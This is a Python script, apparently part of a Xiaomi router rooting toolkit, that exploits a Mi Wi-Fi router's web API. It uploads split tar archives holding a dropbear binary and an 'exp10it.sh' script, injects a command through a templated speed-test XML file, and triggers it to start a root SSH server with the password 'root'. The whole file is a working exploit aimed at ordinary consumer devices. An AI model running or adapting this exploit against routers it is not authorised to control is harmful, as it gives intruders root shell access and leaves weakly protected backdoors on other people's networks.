#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import random
import hashlib
import requests
import socket
import tarfile

import xmir_base
import gateway
from gateway import *


gw = gateway.Gateway(detect_device = False, detect_ssh = False)

if len(sys.argv) > 1:
  ip_addr = sys.argv[1]
  if not ip_addr:
    die("You entered an empty IP-address!")
  gw.ip_addr = ip_addr

gw.set_timeout(4)
gw.detect_device()
if gw.status < 1:
  die("Xiaomi Mi Wi-Fi device not found (IP: {})".format(gw.ip_addr))

dn = gw.device_name

#if dn in 'R2100 R2350 RM1800 RM2100 RA67':
#  import connect2
#  sys.exit(0)

#if dn == 'R3600' and gw.rom_version == '1.0.17':
#  import connect2
#  sys.exit(0)

#if dn == 'RA70' and gw.rom_version.startswith('3.'):
#  import connect4
#  sys.exit(0)

#if dn in 'R3600 RA69 RA70 RA72 RB03':
#  import connect3
#  sys.exit(0)

#if dn in 'RA80 RA82 RB01 RB03 RB06 RB08':
#  import connect4
#  sys.exit(0)

#if dn in 'RD01 RD02 RD03 CR8818 RD04 RD05 RD06 CR8816 CR8819 RD08 ':
if dn.startswith('RD') or dn.startswith('BE') or dn.startswith('CR88'):
  import connect6
  sys.exit(0)

if gw.model_id <= 0 or gw.model_id >= gw.get_modelid_by_name('R2100'):
  import connect5
  sys.exit(0)

# ===============================================================================

print("device_name =", gw.device_name)
print("rom_version = {} {}".format(gw.rom_version, gw.rom_channel))
print("mac = {}".format(gw.mac_address))

gw.ssh_port = 122
ret = gw.detect_ssh(verbose = 1, interactive = True)
if ret > 0:
  if gw.use_ssh:
    die(0, "SSH-server already installed and running")
  else:
    #die(0, "Telnet-server already running")
    pass

use_ssh = True

stok = gw.web_login()

dn_tmp = 'tmp/'
if use_ssh:
  dn_dir = 'data/payload_ssh/'
else:
  dn_dir = 'data/payload/'

print("Begin creating a payload for the exploit...")
fn_payload1 = 'tmp/payload1.tar.gz'
fn_payload2 = 'tmp/payload2.tar.gz'
fn_payload3 = 'tmp/payload3.tar.gz'
if use_ssh:
  fn_pfname = 'dropbearmulti'
else:
  fn_pfname = 'busybox'

fn_pf1 = dn_tmp + fn_pfname + '_01'
fn_pf2 = dn_tmp + fn_pfname + '_02'
fn_pf3 = dn_tmp + fn_pfname + '_03'

fn_suffix = '_mips'
if dn == 'R3D' or dn == 'D01':
  fn_suffix = '_armv7a'
if dn == "RB03":
  fn_suffix = '_arm64'

fn_pf = dn_dir + fn_pfname + fn_suffix

if os.path.exists(fn_payload1):
  os.remove(fn_payload1)
if os.path.exists(fn_payload2):
  os.remove(fn_payload2)
if os.path.exists(fn_payload3):
  os.remove(fn_payload3)

with open(fn_pf, "rb") as file:
  pf = file.read()
psize = len(pf) // 3
wsize = psize + 8000
with open(fn_pf1, "wb") as file:
  file.write(pf[:wsize])
pf = pf[wsize:]
wsize = psize - 8000
with open(fn_pf2, "wb") as file:
  file.write(pf[:wsize])
pf = pf[wsize:]
with open(fn_pf3, "wb") as file:
  file.write(pf)

fn_exploit = "exp10it.sh"
command = "sh /tmp/" + fn_exploit

fn_executor = "speedtest_urls.xml"
with open(dn_dir + fn_executor, "rt", encoding = "UTF-8") as file:
  template = file.read()
data = template.format(router_ip_address=gw.ip_addr, command=command)
with open(dn_tmp + fn_executor, "wt", encoding = "UTF-8", newline = "\n") as file:
  file.write(data)

with tarfile.open(fn_payload1, "w:gz", compresslevel=9) as tar:
  tar.add(fn_pf1, arcname = os.path.basename(fn_pf1))

with tarfile.open(fn_payload2, "w:gz", compresslevel=9) as tar:
  tar.add(fn_pf2, arcname = os.path.basename(fn_pf2))

with tarfile.open(fn_payload3, "w:gz", compresslevel=9) as tar:
  tar.add(fn_pf3, arcname = os.path.basename(fn_pf3))
  tar.add(dn_tmp + fn_executor, arcname = fn_executor)
  tar.add(dn_dir + fn_exploit, arcname = fn_exploit)
  if use_ssh:
    tar.add(dn_dir + 'dropbear.uci.cfg', arcname = 'dropbear.uci.cfg')
    tar.add(dn_dir + 'dropbear.init.d.sh', arcname = 'dropbear.init.d.sh')

if os.path.exists(fn_pf1):
  os.remove(fn_pf1)
if os.path.exists(fn_pf2):
  os.remove(fn_pf2)
if os.path.exists(fn_pf3):
  os.remove(fn_pf3)

tgz_size1 = os.path.getsize(fn_payload1)
if tgz_size1 > 100*1024 - 128:
  die("File size {} exceeds 100KiB".format(fn_payload1)) 

tgz_size2 = os.path.getsize(fn_payload2)
if tgz_size2 > 100*1024 - 128:
  die("File size {} exceeds 100KiB".format(fn_payload2)) 

print("Start uploading the exploit with payload...")

if (fn_payload1):
  requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload1, 'rb')})
if (fn_payload2):
  requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload2, 'rb')})
if (fn_payload3):
  requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload3, 'rb')})

time.sleep(1)

if use_ssh:
  print("Running SSH server on port {}...".format(gw.ssh_port))
  gw.use_ssh = True
else:
  print("Running TELNET and FTP servers...")
  gw.use_ftp = True

requests.get(gw.apiurl + "xqnetdetect/netspeed")

time.sleep(0.5)
gw.passw = 'root'
gw.ping(contimeout = 27)

print("")
print("#### Connection to device {} is OK ####".format(gw.device_name))
